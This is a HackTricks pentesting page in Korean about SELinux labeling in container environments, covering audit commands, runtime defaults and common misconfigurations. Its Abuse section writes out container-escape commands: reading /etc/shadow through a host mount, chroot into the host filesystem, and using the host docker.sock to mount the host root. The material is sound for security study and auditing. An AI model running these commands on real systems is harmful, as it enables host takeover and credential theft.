# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

SELinux는 **label-based Mandatory Access Control** 시스템입니다. 모든 관련 프로세스와 객체에는 security context가 부여될 수 있으며, policy는 어떤 domain이 어떤 type과 어떤 방식으로 상호작용할 수 있는지 결정합니다. containerized environment에서는 일반적으로 runtime이 제한된 container domain에서 container process를 실행하고, 해당 container content에 대응하는 type을 label로 지정합니다. policy가 제대로 작동하면 process는 자신의 label이 접근하도록 허용된 대상을 read하고 write할 수 있지만, 해당 content가 mount를 통해 표시되더라도 다른 host content에 대한 access는 거부될 수 있습니다.

이는 mainstream Linux container deployment에서 사용할 수 있는 가장 강력한 host-side protection 중 하나입니다. Fedora, RHEL, CentOS Stream, OpenShift 및 기타 SELinux 중심 ecosystem에서 특히 중요합니다. 이러한 환경에서 reviewer가 SELinux를 무시하면, host compromise로 이어질 것처럼 보이는 경로가 실제로 차단되는 이유를 잘못 이해하기 쉽습니다.

## AppArmor Vs SELinux

가장 이해하기 쉬운 high-level 차이점은 AppArmor가 path-based인 반면 SELinux는 **label-based**라는 것입니다. 이는 container security에 큰 영향을 줍니다. path-based policy는 동일한 host content가 예상치 못한 mount path 아래에 표시될 경우 다르게 동작할 수 있습니다. 반면 label-based policy는 객체의 label이 무엇인지, 그리고 process domain이 해당 객체에 어떤 작업을 수행할 수 있는지를 확인합니다. 그렇다고 SELinux가 단순해지는 것은 아니지만, AppArmor 기반 시스템에서 defender가 실수로 가정할 수 있는 path-trick 가정의 한 종류에 대해서는 더 강력하게 대응할 수 있습니다.

이 model은 label 중심이므로 container volume 처리와 relabeling 결정은 security-critical합니다. runtime 또는 operator가 "mount가 작동하도록" label을 지나치게 광범위하게 변경하면, workload를 격리하기 위해 마련된 policy boundary가 의도보다 훨씬 약해질 수 있습니다.

## 실습

host에서 SELinux가 active 상태인지 확인하려면:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
호스트에 존재하는 기존 레이블을 확인하려면:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
일반 실행과 labeling이 비활성화된 실행을 비교하려면:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux가 활성화된 host에서는 매우 실용적인 시연이 가능합니다. 예상된 container domain에서 실행되는 workload와 해당 enforcement layer가 제거된 workload의 차이를 보여주기 때문입니다.

## Runtime Usage

Podman은 SELinux가 platform default의 일부인 시스템에서 SELinux와 특히 잘 맞습니다. Rootless Podman과 SELinux의 조합은 mainstream container baseline 중 가장 강력한 편입니다. host 측에서 process가 이미 unprivileged 상태이며, 동시에 MAC policy의 confinement도 적용되기 때문입니다. 지원되는 환경에서는 Docker도 SELinux를 사용할 수 있지만, 관리자가 volume-labeling 문제를 우회하기 위해 SELinux를 비활성화하는 경우가 있습니다. CRI-O와 OpenShift는 container isolation의 핵심 요소로 SELinux에 크게 의존합니다. Kubernetes에서도 SELinux 관련 설정을 노출할 수 있지만, 그 가치는 node OS가 실제로 SELinux를 지원하고 enforce하는지에 따라 달라집니다.<sup>[[2]](#references)</sup>

반복해서 얻을 수 있는 교훈은 SELinux가 선택적인 장식이 아니라는 점입니다. SELinux를 중심으로 구축된 ecosystem에서는 SELinux가 예상되는 security boundary의 일부입니다.

## Misconfigurations

대표적인 실수는 `label=disable`입니다. 운영 환경에서는 volume mount가 거부되었을 때 labeling model을 수정하는 대신, SELinux를 문제에서 제외하는 것이 가장 빠른 단기 해결책이라고 판단하면서 이런 설정을 적용하는 경우가 많습니다.<sup>[[1]](#references)</sup> 또 다른 일반적인 실수는 host content를 잘못 relabeling하는 것입니다. 광범위한 relabel 작업으로 application이 동작하게 만들 수는 있지만, container가 접근할 수 있는 범위가 원래 의도했던 수준을 훨씬 넘어 확장될 수도 있습니다.

또한 **installed** SELinux와 **effective** SELinux를 혼동하지 않는 것이 중요합니다. host가 SELinux를 지원하더라도 permissive mode일 수 있으며, runtime이 workload를 예상된 domain에서 실행하지 않을 수도 있습니다. 이런 경우 protection은 documentation이 암시하는 것보다 훨씬 약합니다.

## Abuse

SELinux가 없거나 permissive 상태이거나 workload에 대해 광범위하게 비활성화되어 있으면, host-mounted path를 abuse하기가 훨씬 쉬워집니다. 원래라면 label에 의해 제한되었을 bind mount가 host data에 접근하거나 host를 수정하는 직접적인 수단이 될 수 있습니다. 이는 writable volume mount, container runtime directory 또는 편의를 위해 민감한 host path를 노출한 운영상의 지름길과 결합될 때 특히 중요합니다.

SELinux는 generic breakout writeup이 한 host에서는 즉시 동작하지만, runtime flag가 비슷한 다른 host에서는 반복해서 실패하는 이유를 설명해 주는 경우가 많습니다. 누락된 요소는 namespace나 capability가 아니라, 그대로 유지된 label boundary인 경우가 많습니다.

가장 빠른 실용적 점검 방법은 active context를 비교한 다음, 일반적으로 label confinement가 적용되는 mounted host path 또는 runtime directory를 probe하는 것입니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
호스트 bind mount가 존재하고 SELinux labeling이 비활성화되었거나 약화된 경우, 정보 공개가 먼저 발생하는 경우가 많습니다:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount가 쓰기 가능하고 kernel 관점에서 container가 사실상 host-root라면, 다음 단계는 추측하는 대신 통제된 host 수정 여부를 테스트하는 것입니다:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux를 지원하는 호스트에서는 runtime state directories 주변의 labels가 사라지면 직접적인 privilege-escalation 경로가 노출될 수도 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
이 명령어들은 full escape chain을 대체하지는 않지만, host data access 또는 host-side file modification을 차단한 원인이 SELinux였는지 매우 빠르게 확인할 수 있게 해줍니다.

### 전체 예시: SELinux 비활성화 + 쓰기 가능한 Host Mount

SELinux labeling이 비활성화되어 있고 host filesystem이 `/host`에 writable로 mount되어 있다면, full host escape는 일반적인 bind-mount abuse case가 됩니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot`가 성공하면 컨테이너 프로세스는 이제 호스트 파일 시스템에서 작동합니다:
```bash
id
hostname
cat /etc/passwd | tail
```
### SELinux 비활성화 + Runtime Directory

labels가 비활성화된 상태에서 workload가 runtime socket에 접근할 수 있다면, escape를 runtime에 위임할 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
관련 관찰 결과는 SELinux가 이러한 종류의 host-path 또는 runtime-state 접근을 차단하는 제어 수단인 경우가 많다는 것입니다.

## 검사

SELinux 검사의 목적은 SELinux가 활성화되어 있는지 확인하고, 현재 security context를 식별하며, 관심 있는 파일이나 경로가 실제로 레이블로 제한되어 있는지 확인하는 것입니다.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
여기서 중요한 점:

- `getenforce`는 이상적으로 `Enforcing`을 반환해야 합니다. `Permissive` 또는 `Disabled`인 경우 전체 SELinux 섹션의 의미가 달라집니다.
- 현재 프로세스 context가 예상과 다르거나 지나치게 광범위해 보인다면, 해당 workload가 의도한 container policy 아래에서 실행되고 있지 않을 수 있습니다.
- host-mounted files 또는 runtime directories의 labels에 프로세스가 지나치게 자유롭게 접근할 수 있다면 bind mounts는 훨씬 더 위험해집니다.

SELinux를 지원하는 platform에서 container를 검토할 때 labeling을 부차적인 세부 사항으로 취급하지 마세요. 많은 경우 labeling은 host가 아직 compromise되지 않은 주요 이유 중 하나입니다.

## Runtime 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 |
| --- | --- | --- | --- |
| Docker Engine | Host에 따라 다름 | SELinux가 활성화된 host에서 SELinux separation을 사용할 수 있지만, 정확한 동작은 host/daemon configuration에 따라 달라짐 | `--security-opt label=disable`, bind mounts의 광범위한 relabeling, `--privileged` |
| Podman | SELinux host에서 일반적으로 활성화됨 | 비활성화하지 않는 한 SELinux separation은 SELinux system의 Podman에서 일반적인 구성 요소임 | `--security-opt label=disable`, `containers.conf`의 `label=false`, `--privileged` |
| Kubernetes | 일반적으로 Pod level에서 자동 할당되지 않음 | SELinux support가 존재하지만, Pod에는 일반적으로 `securityContext.seLinuxOptions` 또는 platform-specific defaults가 필요하며 runtime과 node의 support도 필요함 | 약하거나 광범위한 `seLinuxOptions`, permissive/disabled node에서 실행, labeling을 비활성화하는 platform policies |
| CRI-O / OpenShift style deployments | 일반적으로 크게 의존함 | 이러한 environment에서는 SELinux가 node isolation model의 핵심 부분인 경우가 많음 | access를 과도하게 확장하는 custom policies, compatibility를 위한 labeling 비활성화 |

SELinux defaults는 seccomp defaults보다 distribution에 더 많이 의존합니다. Fedora/RHEL/OpenShift-style system에서는 SELinux가 isolation model의 핵심인 경우가 많습니다. non-SELinux system에서는 SELinux가 단순히 존재하지 않습니다.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Pod 또는 Container의 Security Context 구성](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
